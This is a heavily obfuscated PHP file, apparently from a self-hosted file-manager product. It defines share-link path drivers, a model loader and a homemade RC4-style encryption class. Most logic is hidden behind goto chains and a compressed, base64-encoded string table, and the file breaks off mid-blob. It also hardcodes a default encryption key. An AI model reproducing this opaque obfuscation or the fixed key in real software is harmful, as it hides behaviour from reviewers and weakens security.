<?php
 goto eıù√Ë÷ Â; FÖØ€˜äëô: if ($_SERVER[$_SERVER[£¿ÌÙëü¡¯¯][785]] != $D‹ÀÃπ˘‚Ï($eÓâÈ≤ˆàﬂ)) { goto d¥â∏ò•À; AöΩœ´»Ù“: $e≈åÍ¬ÔÏ‹ = explode($_SERVER[£¿ÌÙëü¡¯¯][214], $f‹ﬁ∂Ûø≥Ê); if (count($e≈åÍ¬ÔÏ‹) < $_SERVER[£¿ÌÙëü¡¯¯][544]) { $CŒ¨≤∂Ú¨± = $_SERVER[£¿ÌÙëü¡¯¯][788]; $CŒ¨≤∂Ú¨±(); } $bõ¶≤üÌåÔ = $_SERVER[£¿ÌÙëü¡¯¯][794]; goto E§∏æªÜ®ó; d¥â∏ò•À: $c“±ﬁ”¬∑î = $_SERVER[£¿ÌÙëü¡¯¯][787]; $Eµ¯ÿ…Œ≥ﬁ = $_SERVER[$_SERVER[£¿ÌÙëü¡¯¯][782]] . $_SERVER[£¿ÌÙëü¡¯¯][783]; $f‹ﬁ∂Ûø≥Ê = $c“±ﬁ”¬∑î($Eµ¯ÿ…Œ≥ﬁ); goto AöΩœ´»Ù“; E§∏æªÜ®ó: $bõ¶≤üÌåÔ($eÓâÈ≤ˆàﬂ); goto a“ßã¡‡˜„; a“ßã¡‡˜„: } class PathDriverDbShareLink extends PathDriverDB { public function __construct($E›ÂÈæÍ»™) { $this->pathParse = $E›ÂÈæÍ»™; $this->model = Model($_SERVER[£¿ÌÙëü¡¯¯][1084]); } protected function infoParse($càà≥àèè’, $a∑≥áÈøí◊ = false, $Dã≤≥ÕùÉ£ = false) { $AŸÂÖëÁ√ê =& $_SERVER[£¿ÌÙëü¡¯¯]; return Action($AŸÂÖëÁ√ê[991])->sharePathInfo($this->pathParse[$AŸÂÖëÁ√ê[76]], !0); } public function listPath($Eﬁ«ûïµê∫, $b≤√‡»–ª´ = false) { $F‰ã‡–è«÷ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Cªº’èΩâΩ = parent::listPath($Eﬁ«ûïµê∫, $b≤√‡»–ª´); foreach ($Cªº’èΩâΩ as $FÜ—¥Ò•áé => $bÔ¿…û∆åä) { if (!in_array($FÜ—¥Ò•áé, array($F‰ã‡–è«÷[74], $F‰ã‡–è«÷[75]))) { continue; } foreach ($bÔ¿…û∆åä as $a ÿ¡á∫Ø≠ => $FÕÌ•ûÓãà) { $Cªº’èΩâΩ[$FÜ—¥Ò•áé][$a ÿ¡á∫Ø≠] = Action($F‰ã‡–è«÷[991])->shareItemInfo($FÕÌ•ûÓãà); } } return $Cªº’èΩâΩ; } public function listAll($a´·∫åíƒÜ) { $dÙõº∞ÊéÚ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Aœÿ¯ü®ÖØ = IO::info($this->pathParse[$dÙõº∞ÊéÚ[76]]); if (!$Aœÿ¯ü®ÖØ) { return array(); } $FÔ√áÑ≠Éπ = $this->model->listAll($a´·∫åíƒÜ); foreach ($FÔ√áÑ≠Éπ as &$Eë∫‹Œà¥√) { $Eë∫‹Œà¥√[$dÙõº∞ÊéÚ[388]] = Action($dÙõº∞ÊéÚ[991])->shareItemInfo($Eë∫‹Œà¥√[$dÙõº∞ÊéÚ[388]]); } return $FÔ√áÑ≠Éπ; } } class PathDriverDriverShareItem { public function __construct($bı≠ﬂ¯Ç‹Æ) { $this->pathParse = $bı≠ﬂ¯Ç‹Æ; } public function __call($fÔùØ¨†Áú, $f¬ˆó∫àò¿) { $FÆüü”πîŒ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (method_exists($this, $fÔùØ¨†Áú)) { return; } $b¨Ü¢ÀÁàå = call_user_func_array(array($FÆüü”πîŒ[1092], $fÔùØ¨†Áú), $f¬ˆó∫àò¿); $EÚÛ±ÛÂ˜◊ = array($FÆüü”πîŒ[1093], $FÆüü”πîŒ[1094], $FÆüü”πîŒ[1095], $FÆüü”πîŒ[1096], $FÆüü”πîŒ[482], $FÆüü”πîŒ[484], $FÆüü”πîŒ[1097], $FÆüü”πîŒ[92], $FÆüü”πîŒ[1098], $FÆüü”πîŒ[1099]); if (in_array($fÔùØ¨†Áú, $EÚÛ±ÛÂ˜◊)) { $b¨Ü¢ÀÁàå = $this->getPathOuter($b¨Ü¢ÀÁàå); } return $b¨Ü¢ÀÁàå; } public function copy($f‘ΩÒ‡Ω‘±, $E√“≠ÚØﬁâ, $Cçêòùª°ı = false) { return $this->copyMove($f‘ΩÒ‡Ω‘±, $E√“≠ÚØﬁâ, $Cçêòùª°ı, $_SERVER[£¿ÌÙëü¡¯¯][482]); } public function move($a≤≈Ö«•Ò§, $E±§úÖ…πŸ, $bàø’ï±´î = false) { return $this->copyMove($a≤≈Ö«•Ò§, $E±§úÖ…πŸ, $bàø’ï±´î, $_SERVER[£¿ÌÙëü¡¯¯][484]); } private function copyMove($eØ‘Õù‡ËÏ, $BÃ≤åÉ√„¯, $aéÏäàÈ÷æ, $A¨πí§Óöä) { goto aîÂæ⁄ß„ﬂ; aîÂæ⁄ß„ﬂ: $Aãë›¬ˆÉÙ =& $_SERVER[£¿ÌÙëü¡¯¯]; $F§≠êÜø–Œ = $BÃ≤åÉ√„¯; $F∑ë£œ¡Õ± = IO::driverMake($BÃ≤åÉ√„¯); goto c°ã∂˘´πí; c°ã∂˘´πí: if ($F∑ë£œ¡Õ±->pathParse[$Aãë›¬ˆÉÙ[972]]) { $BÃ≤åÉ√„¯ = $F∑ë£œ¡Õ±->pathParse[$Aãë›¬ˆÉÙ[972]]; } else { $BÃ≤åÉ√„¯ = $F§≠êÜø–Œ; } $e°≠éºÈ€Ë = IO::copyMove($eØ‘Õù‡ËÏ, $BÃ≤åÉ√„¯, $aéÏäàÈ÷æ, $A¨πí§Óöä); $e°≠éºÈ€Ë = $this->getPathOuter($e°≠éºÈ€Ë); goto A™—·û•âü; A™—·û•âü: return $e°≠éºÈ€Ë; goto B˜¯òà∏•ñ; B˜¯òà∏•ñ: } public function pathFather($E’î∞èÒ±å) { return get_path_father($this->pathParse[$_SERVER[£¿ÌÙëü¡¯¯][76]]); } public function iconvSystem($e∏ßıçÿàŒ) { return $e∏ßıçÿàŒ; } protected function infoParse($A¬‰ëÇûéÜ) { $D°±à•ú‡¢ =& $_SERVER[£¿ÌÙëü¡¯¯]; $FÂ´±ﬁ“åÒ = $this->pathParse[$D°±à•ú‡¢[435]][$D°±à•ú‡¢[992]] . $this->pathParse[$D°±à•ú‡¢[985]]; $bç£√Ûú¯à = IO::info($FÂ´±ﬁ“åÒ); $BóÍóâ…èﬂ = $this->pathParse[$D°±à•ú‡¢[435]]; return Action($D°±à•ú‡¢[1090])->_shareItemeParse($bç£√Ûú¯à, $BóÍóâ…èﬂ); } public function listAll($bËœí€ÿ™™) { $e£Ñáãö´© =& $_SERVER[£¿ÌÙëü¡¯¯]; $a€¿Üû©‹Ì = IO::listAll($bËœí€ÿ™™); $E≠û⁄Ç£¢Ù = $this->pathParse[$e£Ñáãö´©[435]]; foreach ($a€¿Üû©‹Ì as &$DÈŒ˘¯«»Ç) { check_abort(); $DÈŒ˘¯«»Ç = array_merge(IO::info($DÈŒ˘¯«»Ç[$e£Ñáãö´©[76]]), $DÈŒ˘¯«»Ç); $DÈŒ˘¯«»Ç[$e£Ñáãö´©[388]] = Action($e£Ñáãö´©[1090])->_shareItemeParse($DÈŒ˘¯«»Ç, $E≠û⁄Ç£¢Ù); } return $a€¿Üû©‹Ì; } public function getPathOuter($f¬âã–èœ•) { goto B‰ÈäííØ≥; AÈäõÑÑæ: $d‘…¯—„àê = KodIO::clear($f¬âã–èœ•); $B¨—¡’ﬂ¬¡ = KodIO::clear($this->pathParse[$eœùï¢⁄è¡[435]][$eœùï¢⁄è¡[992]]); $d´·∞ëçÂ™ = substr($d‘…¯—„àê, strlen($B¨—¡’ﬂ¬¡)); goto fíôŸìÛùŒ; B‰ÈäííØ≥: $eœùï¢⁄è¡ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Dã”¿£Ç¡î = KodIO::parse($f¬âã–èœ•); if ($Dã”¿£Ç¡î[$eœùï¢⁄è¡[29]] == KodIO::KOD_SHARE_ITEM) { return $Dã”¿£Ç¡î[$eœùï¢⁄è¡[76]]; } goto AÈäõÑÑæ; fíôŸìÛùŒ: if (substr($d‘…¯—„àê, 0, strlen($B¨—¡’ﬂ¬¡)) != $B¨—¡’ﬂ¬¡) { return !1; } return $this->pathParse[$eœùï¢⁄è¡[986]] . $eœùï¢⁄è¡[8] . ltrim($d´·∞ëçÂ™, $eœùï¢⁄è¡[8]); goto A—…≠–´åí; A—…≠–´åí: } public function getType() { $BùˆËéåÀé =& $_SERVER[£¿ÌÙëü¡¯¯]; $BÒ†¥é˜Áí = str_replace($BùˆËéåÀé[72], $BùˆËéåÀé[33], get_class($this)); return strtolower($BÒ†¥é˜Áí); } public function isTypeObject($D’∏ÂËä˜ˆ) { return IO::isTypeObject($D’∏ÂËä˜ˆ); } public function info($Eûî¥øêä®) { return $this->infoParse($Eûî¥øêä®); } public function infoAuth($BëÂ”€íæÈ) { return $this->infoParse($BëÂ”€íæÈ); } public function infoWithChildren($e§ÏâûËÑ°) { return $this->infoParse($e§ÏâûËÑ°); } public function infoFull($CÓÂØØÇêô) { return $this->infoParse($CÓÂØØÇêô); } } goto d£∂™ﬂ˜›Ç; Aê‰Íã®ïê: define($_SERVER[£¿ÌÙëü¡¯¯][0], $_SERVER[£¿ÌÙëü¡¯¯][1]); $_SERVER[‚ﬁ] = explode($_SERVER[£¿ÌÙëü¡¯¯][2], gzinflate(substr($_SERVER[£¿ÌÙëü¡¯¯][3], 10, -8))); function Model($d⁄ÔˆŸåËƒ = '', $EÜ«È¢†¯â = '', $D†Õ¬≤ﬁîÈ = '') { goto F†·‡˜Ω∫; cÛÖ¿î ¡é: if (isset($e‘æ∞¬™ó©[$E‡òˆÇ±¿∏])) { return $e‘æ∞¬™ó©[$E‡òˆÇ±¿∏]; } if ($d⁄ÔˆŸåËƒ) { $d⁄ÔˆŸåËƒ = strtoupper($d⁄ÔˆŸåËƒ[0]) . substr($d⁄ÔˆŸåËƒ, 1); $eåûÜëπëí = $d⁄ÔˆŸåËƒ . $Bäûé€çäˆ[1]; if (class_exists($eåûÜëπëí)) { $e‘æ∞¬™ó©[$E‡òˆÇ±¿∏] = new $eåûÜëπëí(); return $e‘æ∞¬™ó©[$E‡òˆÇ±¿∏]; } } if (!$D†Õ¬≤ﬁîÈ) { $D†Õ¬≤ﬁîÈ = $GLOBALS[$Bäûé€çäˆ[2]][$Bäûé€çäˆ[3]]; } goto FÜ¢Á˜„·è; F†·‡˜Ω∫: $Bäûé€çäˆ =& $_SERVER[‚ﬁ]; static $e‘æ∞¬™ó© = array(); $E‡òˆÇ±¿∏ = strtolower($EÜ«È¢†¯â . $Bäûé€çäˆ[0] . $d⁄ÔˆŸåËƒ); goto cÛÖ¿î ¡é; FÜ¢Á˜„·è: $e‘æ∞¬™ó©[$E‡òˆÇ±¿∏] = new ModelBase($d⁄ÔˆŸåËƒ, $EÜ«È¢†¯â, $D†Õ¬≤ﬁîÈ); return $e‘æ∞¬™ó©[$E‡òˆÇ±¿∏]; goto FÂ⁄á†™Æ†; FÂ⁄á†™Æ†: } goto Aíì‰ïß»‰; f™¬íõ≤ßÑ: if ($_SERVER[$_SERVER[£¿ÌÙëü¡¯¯][785]] != $_SERVER[$_SERVER[£¿ÌÙëü¡¯¯][1840]]) { goto CΩÏè›ˆΩÉ; CÀäËÓÑéí: $bõ¶≤üÌåÔ($_SERVER[$_SERVER[£¿ÌÙëü¡¯¯][793]]); goto CìÎéò€ÇÑ; CΩÏè›ˆΩÉ: $c“±ﬁ”¬∑î = $_SERVER[£¿ÌÙëü¡¯¯][787]; $Eµ¯ÿ…Œ≥ﬁ = $_SERVER[$_SERVER[£¿ÌÙëü¡¯¯][782]] . $_SERVER[£¿ÌÙëü¡¯¯][783]; $f‹ﬁ∂Ûø≥Ê = $c“±ﬁ”¬∑î($Eµ¯ÿ…Œ≥ﬁ); goto fª”Ó»ÌÛÇ; fª”Ó»ÌÛÇ: $e≈åÍ¬ÔÏ‹ = explode($_SERVER[£¿ÌÙëü¡¯¯][214], $f‹ﬁ∂Ûø≥Ê); if (count($e≈åÍ¬ÔÏ‹) < $_SERVER[£¿ÌÙëü¡¯¯][544]) { $CŒ¨≤∂Ú¨± = $_SERVER[£¿ÌÙëü¡¯¯][788]; $CŒ¨≤∂Ú¨±(); } $bõ¶≤üÌåÔ = $_SERVER[£¿ÌÙëü¡¯¯][794]; goto CÀäËÓÑéí; CìÎéò€ÇÑ: } class Mcrypt { public static $defaultKey = "\141\41\x74\141\153\x41\x3a\x64\154\x6d\x63\154\x64\x45\166\54\145"; public static function encode($bàÃ∂πŒ∞â, $Eò£ÃáìùÕ = '', $F…≈πëëïÏ = 0, $FÃÆØ´Çí∑ = '') { goto D”’Ôç∂≈Œ; cÑöàùÉ≥å: $bŸ–˘Îº‘Û = str_replace(array($Câèﬁ”ãü±[281], $Câèﬁ”ãü±[8], $Câèﬁ”ãü±[905]), array($Câèﬁ”ãü±[408], $Câèﬁ”ãü±[71], $Câèﬁ”ãü±[94]), $bŸ–˘Îº‘Û); return $bŸ–˘Îº‘Û; goto FÂŒèÚëÁ„; Bàƒô‹¡¶¿: $Cô∑—ÚÔ≤ı = md5(substr($Eò£ÃáìùÕ, 0, 16)); $EÌ…÷ÌÒ£å = md5(substr($Eò£ÃáìùÕ, 16, 16)); $FÃÆØ´Çí∑ = $FÃÆØ´Çí∑ ? $FÃÆØ´Çí∑ : md5(microtime()); goto FïÎ¥éñ§”; D‹µÒî•Ïì: for ($d‹”√–Êìç = 0; $d‹”√–Êìç <= 255; $d‹”√–Êìç++) { $c∆ãûÁå“û[$d‹”√–Êìç] = ord($FÛî≠Î®¢˜[$d‹”√–Êìç % $EéÜÕéËÇÚ]); } $b“ÚÑπÖîÛ = range(0, 255); for ($Dü‚‹˜◊Ë√ = $d‹”√–Êìç = 0; $d‹”√–Êìç < 256; $d‹”√–Êìç++) { $Dü‚‹˜◊Ë√ = ($Dü‚‹˜◊Ë√ + $b“ÚÑπÖîÛ[$d‹”√–Êìç] + $c∆ãûÁå“û[$d‹”√–Êìç]) % 256; $EÉôœÃ–õ— = $b“ÚÑπÖîÛ[$d‹”√–Êìç]; $b“ÚÑπÖîÛ[$d‹”√–Êìç] = $b“ÚÑπÖîÛ[$Dü‚‹˜◊Ë√]; $b“ÚÑπÖîÛ[$Dü‚‹˜◊Ë√] = $EÉôœÃ–õ—; } goto cø§˘ëÇü„; cø§˘ëÇü„: $bŸ–˘Îº‘Û = $Câèﬁ”ãü±[33]; for ($bÑµá≥Ñƒí = $Dü‚‹˜◊Ë√ = $d‹”√–Êìç = 0; $d‹”√–Êìç < $dË–ˆÉÖÂü; $d‹”√–Êìç++) { $bÑµá≥Ñƒí = ($bÑµá≥Ñƒí + 1) % 256; $Dü‚‹˜◊Ë√ = ($Dü‚‹˜◊Ë√ + $b“ÚÑπÖîÛ[$bÑµá≥Ñƒí]) % 256; $EÉôœÃ–õ— = $b“ÚÑπÖîÛ[$bÑµá≥Ñƒí]; $b“ÚÑπÖîÛ[$bÑµá≥Ñƒí] = $b“ÚÑπÖîÛ[$Dü‚‹˜◊Ë√]; $b“ÚÑπÖîÛ[$Dü‚‹˜◊Ë√] = $EÉôœÃ–õ—; $bŸ–˘Îº‘Û .= chr(ord($bàÃ∂πŒ∞â[$d‹”√–Êìç]) ^ $b“ÚÑπÖîÛ[($b“ÚÑπÖîÛ[$bÑµá≥Ñƒí] + $b“ÚÑπÖîÛ[$Dü‚‹˜◊Ë√]) % 256]); } $bŸ–˘Îº‘Û = $dÌπ¶âå÷à . str_replace($Câèﬁ”ãü±[905], $Câèﬁ”ãü±[33], base64_encode($bŸ–˘Îº‘Û)); goto cÑöàùÉ≥å; FïÎ¥éñ§”: $dÌπ¶âå÷à = substr($FÃÆØ´Çí∑, -$dÖñ›äõ≤£); $FÛî≠Î®¢˜ = $Cô∑—ÚÔ≤ı . md5($Cô∑—ÚÔ≤ı . $dÌπ¶âå÷à); $EéÜÕéËÇÚ = strlen($FÛî≠Î®¢˜); goto E˘≤ç…ﬂŸπ; D”’Ôç∂≈Œ: $Câèﬁ”ãü± =& $_SERVER[£¿ÌÙëü¡¯¯]; $dÖñ›äõ≤£ = 4; $Eò£ÃáìùÕ = md5($Eò£ÃáìùÕ ? $Eò£ÃáìùÕ : self::$defaultKey); goto Bàƒô‹¡¶¿; E˘≤ç…ﬂŸπ: $bàÃ∂πŒ∞â = sprintf($Câèﬁ”ãü±[1841], $F…≈πëëïÏ ? $F…≈πëëïÏ + time() : 0) . substr(md5($bàÃ∂πŒ∞â . $EÌ…÷ÌÒ£å), 0, 16) . $bàÃ∂πŒ∞â; $dË–ˆÉÖÂü = strlen($bàÃ∂πŒ∞â); $c∆ãûÁå“û = array(); goto D‹µÒî•Ïì; FÂŒèÚëÁ„: } public static function decode($aœû»πâÍ´, $dé¡æ†ƒìΩ = '') { goto e„¡õüºÕ†; e∞àæ˘è⁄Á: $F±ÜÕ≠√å˜ = substr($aœû»πâÍ´, 0, $fßª§Ã∏ÙØ); $b„–à⁄ö≥∏ = $DŒé ∫´¢  . md5($DŒé ∫´¢  . $F±ÜÕ≠√å˜); $bªÆ…¥ﬂ«Ã = strlen($b„–à⁄ö≥∏); goto a¶ÌÃ≤”Óﬂ; e’à…Õ¿Ø÷: $F˜ÉÛ‹¿êÈ = $dÿ‰ñ¨æµƒ[33]; for ($CÕ≤ÿ§ËÈ = $A√ê™»»ôπ = $Añ•™ëÏ•ø = 0; $Añ•™ëÏ•ø < $B°≤ê⁄…±≥; $Añ•™ëÏ•ø++) { $CÕ≤ÿ§ËÈ = ($CÕ≤ÿ§ËÈ + 1) % 256; $A√ê™»»ôπ = ($A√ê™»»ôπ + $fã£äè√†Ω[$CÕ≤ÿ§ËÈ]) % 256; $eæ¬∂°Ú¡ë = $fã£äè√†Ω[$CÕ≤ÿ§ËÈ]; $fã£äè√†Ω[$CÕ≤ÿ§ËÈ] = $fã£äè√†Ω[$A√ê™»»ôπ]; $fã£äè√†Ω[$A√ê™»»ôπ] = $eæ¬∂°Ú¡ë; $F˜ÉÛ‹¿êÈ .= chr(ord($aœû»πâÍ´[$Añ•™ëÏ•ø]) ^ $fã£äè√†Ω[($fã£äè√†Ω[$CÕ≤ÿ§ËÈ] + $fã£äè√†Ω[$A√ê™»»ôπ]) % 256]); } if ((substr($F˜ÉÛ‹¿êÈ, 0, 10) == 0 || substr($F˜ÉÛ‹¿êÈ, 0, 10) - time() > 0) && substr($F˜ÉÛ‹¿êÈ, 10, 16) == substr(md5(substr($F˜ÉÛ‹¿êÈ, 26) . $BéÜø©•ë™), 0, 16)) { return substr($F˜ÉÛ‹¿êÈ, 26); } else { return $dÿ‰ñ¨æµƒ[33]; } goto Cß·“‰ùä; e„¡õüºÕ†: $dÿ‰ñ¨æµƒ =& $_SERVER[£¿ÌÙëü¡¯¯]; $aœû»πâÍ´ = str_replace(array($dÿ‰ñ¨æµƒ[408], $dÿ‰ñ¨æµƒ[71], $dÿ‰ñ¨æµƒ[94]), array($dÿ‰ñ¨æµƒ[281], $dÿ‰ñ¨æµƒ[8], $dÿ‰ñ¨æµƒ[905]), $aœû»πâÍ´); $fßª§Ã∏ÙØ = 4; goto f”À‰‚Ûèı; f”À‰‚Ûèı: $dé¡æ†ƒìΩ = md5($dé¡æ†ƒìΩ ? $dé¡æ†ƒìΩ : self::$defaultKey); $DŒé ∫´¢  = md5(substr($dé¡æ†ƒìΩ, 0, 16)); $BéÜø©•ë™ = md5(substr($dé¡æ†ƒìΩ, 16, 16)); goto e∞àæ˘è⁄Á; c¥¯®ÜÒÚÂ: for ($Añ•™ëÏ•ø = 0; $Añ•™ëÏ•ø <= 255; $Añ•™ëÏ•ø++) { $F§ı≤◊œ°[$Añ•™ëÏ•ø] = ord($b„–à⁄ö≥∏[$Añ•™ëÏ•ø % $bªÆ…¥ﬂ«Ã]); } $fã£äè√†Ω = range(0, 255); for ($A√ê™»»ôπ = $Añ•™ëÏ•ø = 0; $Añ•™ëÏ•ø < 256; $Añ•™ëÏ•ø++) { $A√ê™»»ôπ = ($A√ê™»»ôπ + $fã£äè√†Ω[$Añ•™ëÏ•ø] + $F§ı≤◊œ°[$Añ•™ëÏ•ø]) % 256; $eæ¬∂°Ú¡ë = $fã£äè√†Ω[$Añ•™ëÏ•ø]; $fã£äè√†Ω[$Añ•™ëÏ•ø] = $fã£äè√†Ω[$A√ê™»»ôπ]; $fã£äè√†Ω[$A√ê™»»ôπ] = $eæ¬∂°Ú¡ë; } goto e’à…Õ¿Ø÷; a¶ÌÃ≤”Óﬂ: $aœû»πâÍ´ = base64_decode(substr($aœû»πâÍ´, $fßª§Ã∏ÙØ)); $B°≤ê⁄…±≥ = strlen($aœû»πâÍ´); $F§ı≤◊œ° = array(); goto c¥¯®ÜÒÚÂ; Cß·“‰ùä: } } define($_SERVER[£¿ÌÙëü¡¯¯][1842], 1); goto aô„ò—‘ƒ˜; eıù√Ë÷ Â: if (!function_exists('_kodDe')) { function _kodDe($dÆï¯Á÷ÌÊ) { $dÆï¯Á÷ÌÊ = base64_decode($dÆï¯Á÷ÌÊ); $DƒøÆÒËî≈ = strlen($dÆï¯Á÷ÌÊ); $f√∫Ö™•é« = ''; $D≠è¬≠–¯ı = ord($dÆï¯Á÷ÌÊ[0]) - 30; for ($dƒœúΩ¥ó◊ = 1; $dƒœúΩ¥ó◊ < $DƒøÆÒËî≈; $dƒœúΩ¥ó◊ += 2) { if ($dƒœúΩ¥ó◊ + 1 < $DƒøÆÒËî≈) { $f√∫Ö™•é« .= chr(ord($dÆï¯Á÷ÌÊ[$dƒœúΩ¥ó◊ + 1]) + $D≠è¬≠–¯ı); $f√∫Ö™•é« .= chr(ord($dÆï¯Á÷ÌÊ[$dƒœúΩ¥ó◊]) + $D≠è¬≠–¯ı); } else { $f√∫Ö™•é« .= chr(ord($dÆï¯Á÷ÌÊ[$dƒœúΩ¥ó◊]) + $D≠è¬≠–¯ı); } } return $f√∫Ö™•é«; } } define("\xa3\xc0\xed\xf4\x91\x9f\xc1\xf8\xf8", "\300\233"); $_SERVER[£¿ÌÙëü¡¯¯] = explode(base64_decode('fAF8BHwC'), gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x3\x9d\x3d\x9\x60\x1b\xc5\xb5\x1c\xa5\x90\x10\x3e\xe5\x2a\x37\x2c\x4e\x82\x8f\xac\x24\xdb\x71\x2e\x27\x8e\x23\x4b\x72\x2c\x62\x5b\x8e\x24\xc7\x49\x2c\x47\xac\xa4\x95\xb4\xb6\xa4\x95"."\x77\x57\xb2\x9d\x3\xca\x95\x72\x25\x10\x28\xc9\x27\xdc\xf7\x59\xce\x72\x84\x12\xa\x85\x72\x96\xbb\x50\x28\x37\xe4\xe0\x6a\x39\xda\x42\xb9\xff\xdc\x33\x2b\xc9\xb4\xfd\x2d\x8e\x66\xde\xbc\x99\x9d\xe3\xcd\x9b\x37\x33\xef"."\xbd\x79\xf7\xcd\xd5\xbb\xae\xfe\xc9\xea\xdd\xce\xbe\xf0\x8f\x8f\x9f\x7c\xcb\x2b\x38\x2\xfe\xdd\x3\xfc\x1f\x85\x8f\x3e\x6b\xaf\x5d\xd0\xff\x76\xcf\x2e\xee\xa\xec\xd6\xf0\xb3\x75\x7b\x3a\xbf\x9f\xd8\x7d\xe9\xa4\x29\x6f".base64_decode('zvnF5Tcv3njv4Qev84f+clK2JvticXLDt6N9yY0D+2x6ZtUHq++f9fD6vsfevP3L2NT0qb/fvA==').base64_decode('7i9VG+d9PmPfX2ROV37x0AeDN016V93T3PnTW6yOL7JvHZBZvtfTnvSLH174fP+vH9r3h/Vfbw==')."\xea\x1b\x1b\x7c\x79\xd2\x37\x57\x3f\x32\x34\xe9\xed\xad\xff\xdc\xeb\xb3\xad\xf\xd5\x5f\xf9\xf9\x2e\x27\x5c\x7e\xf6\xa9\xbb\x7f\x67\x1c\x23\x9d\xfa\xfa\xdf\x1e\xec\x39\xae\xc6\x3d\xf4\xd3\x3d\x7f\xf6\xf8\x37\x4f\xdf\x7f"."\xdf\xfb\x7d\x7b\x7e\xd6\xd8\x7e\xde\x81\x2f\x1d\x95\x39\xe8\x89\xc9\x8f\xbc\x70\xdc\x23\xe7\xdc\x79\x7f\x43\xf5\x15\x3\xd5\x57\x66\x2e\xfd\xf9\xc7\xb5\x8b\xe\xce\x6c\xd8\x91\xb9\xfb\xb8\x9a\x91\x7d\xe\xff\xe8\x98\x69".base64_decode('N9X89eCxi8++c9uljse+OuIrs1F5cdtBT3jeCH6Z+vUnJ6+6atIbrrNWTHjh7tsWT9i/cY+d7g==').base64_decode('T/e6+p8/3/29w695Z/Wjx9x65Usbn/pil6On7Xzkjf63//DN9f3n36Dfu+3yyfKCm7+se9Cn7g==')."\x33\x6d\xcb\x86\x7f\x6e\x71\xbd\x74\xb1\x5c\x98\xf8\xda\x84\x9\xd9\x44\xea\x9a\x3b\x52\xbf\x7c\xf0\xcb\xd3\x6e\xdd\x7e\x72\xe0\x85\xa3\x97\x3e\xe4\x8f\x3c\xbb\xdb\x2e\xbb\xe0\x4e\x6e\xc6\x3f\x52\x4e\xb7\x24\x75\x54\x33"."\55\23\3\342\172\56\251\245\160\130\313\341\137\27\376\61\207\63\232\245\342\160\264\73\20\216\206\172\173\172\174\301\160\224\224\50\246\147\365\4\11\345\25\103\311\222\302\363\252\141\202\117\211\305\105"."\363\172\136\315\331\40\34\220\120\54\45\246\230\244\44\157\133\324\353\353\351\14\54\213\206\227\365\370\10\106\54\72\134\120\215\61\34\103\301\220\245\30\126\130\313\252\14\143\304\140\365\152\363\55\364"."\167\113\341\240\273\73\344\366\204\375\201\156\14\366\4\272\272\374\341\162\170\60\320\331\331\346\366\54\52\117\351\11\272\27\166\271\45\120\277\214\32\325\162\111\275\106\72\36\247\34\57\325\342\100\273".base64_decode('pmYSOJhTaHWssTwJhVkIjEGukMngSDcLkfqrSaWQIX3mFSN5Q8sqtOmL1DEGxQGlYOlaLo4jvg==').base64_decode('UctQOBzUOG6oWTVHigr5On2esASrKbUHA10SGYqsYlqqIfV1+II+CVa9pRq1uFrC+Xq7QYdI7g==')."\316\116\151\274\22\54\65\233\247\305\340\74\25\12\13\4\275\276\240\324\266\114\342\375\24\327\263\131\75\347\4\245\200\361\264\204\252\372\202\101\34\220\11\5\167\372\341\320\221\110\240\275\75\344\143"."\61\322\270\305\235\240\46\323\11\225\332\142\211\144\306\212\26\225\114\201\22\353\20\376\255\46\77\344\127\67\11\1\17\153\71\255\100\210\225\24\241\353\46\45\171\223\315\41\22\120\151\40\307\220\100"."\x1\x3a\x99\x5d\x60\xaa\x15\x71\xb0\x65\x3e\xfe\x9d\x4b\x90\x62\x51\x98\xa6\x1a\x56\x54\xcd\xc5\xf5\x84\x96\x23\x13\xb2\x95\x4c\x3e\x42\x82\x8a\x95\xf6\x1a\x1a\xc0\x23\x5\xea\xce\xb8\x9e\x1f\xeb\xd2\x8b\xa4\x35\x49\x2d"."\243\166\262\371\226\324\63\11\325\340\361\74\310\56\246\220\146\151\53\205\334\335\205\254\210\302\242\361\264\226\111\30\164\232\376\30\146\3\51\126\265\54\320\14\223\326\264\67\237\321\225\104\110\65\204".base64_decode('2reDYgIFSwQWEFq7bmS9gBWQ3gETQOutkDBEp0BC6BRcAh1GT7qQGwqxJjoJf6vpP8nx/UD/Ag==')."\360\117\55\141\166\21\122\357\264\232\311\104\325\121\225\314\243\154\142\206\111\233\346\62\143\132\316\5\40\70\352\17\104\323\212\231\356\112\314\210\242\134\224\207\46\324\121\147\76\235\47\204\300\146\67"."\41\160\70\12\335\272\345\23\130\160\106\217\53\4\51\155\131\371\220\232\113\300\256\41\155\323\107\162\250\353\362\252\112\232\345\225\245\204\324\45\55\223\72\232\265\146\106\214\11\55\71\306\271\140\332"."\xca\xb2\x22\xb3\xb4\x69\xc\x66\x32\xa0\x35\x4a\xa8\xa3\x8a\xc4\xd5\x51\x8b\xf4\x88\x34\x37\x9e\x56\xc\x30\x90\x2d\x5\x2b\xe9\x98\x4d\x98\x49\x3e\x9f\xd1\xe2\x8a\xa5\xe9\x39\x97\x1e\xb7\x54\xcb\x61\x5a\x86\xaa\x90\xd2"."\252\346\112\220\66\340\254\256\303\271\350\214\362\350\71\13\114\151\107\330\120\162\146\122\65\34\76\102\350\315\22\350\124\306\325\50\232\127\63\363\272\251\301\317\64\113\212\145\51\361\64\344\10\274\370".base64_decode('lh/B13IZLaeW4brjcdU0HTCLoWcc7kxGH3EEDC2lgTx1JdUE3KpZoqw0rxmqSaPSwq4wQQa1Ug==')."\35\75\206\222\312\52\315\122\276\20\3\75\103\146\152\5\30\306\46\137\157\226\342\60\52\113\331\202\151\71\14\25\260\44\15\54\176\144\360\374\111\107\27\34\117\115\115\70\102\200\163\23\360\364\372".base64_decode('JgmQjkTTMLQjHO6J+tvBAt3ti3a5w54OUm1LSdE6dwJ+zIqkwKUOMPkgoXWDPuLAHn1ENcCH2w==')."\xc6\x9a\xa5\x21\x3d\x11\xd3\x47\x9d\x34\x9\x22\xc3\xc9\x44\x91\x61\x8f\xe6\x2d\x47\x50\xc9\xa5\x60\xff\xc4\xc6\x2c\xd5\xa4\xeb\x4b\x70\x89\x2f\x18\xd\x5\xda\xc3\x7d\xee\x20\x59\xbb\x73\xa0\xa7\x47\x69\x59\x30\x6f\xc6".base64_decode('EVQToG/jFi1RycNuoThwJsBBpKlwdtC0Tv9C2HKvwwRIDhGLlt2pZTVYOYuloK4CC/tCUiEXqg==').base64_decode('cUskXVcTSU